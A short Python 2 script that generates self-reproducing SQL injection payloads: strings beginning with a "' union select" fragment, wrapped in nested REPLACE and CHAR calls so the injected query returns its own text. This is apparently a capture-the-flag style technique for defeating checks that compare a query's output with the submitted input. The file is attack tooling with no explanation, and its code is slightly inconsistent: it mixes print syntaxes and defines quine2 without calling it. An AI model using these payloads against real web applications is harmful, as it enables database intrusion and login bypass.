def quine(data, debug=True):
    if debug: print data
    data = data.replace('$$',"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
    blob = data.replace('$$','"$"').replace("'",'"')
    data = data.replace('$$',"'"+blob+"'")
    if debug: print data
    return data

print(quine("$$' union select "))
   
def quine2(data):
    data = data.replace('$$', "REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
    blob = data.replace('$$', '"$"')
    data = data.replace('$$', "'"+blob+"'")
    return data

print(quine("' union select "))

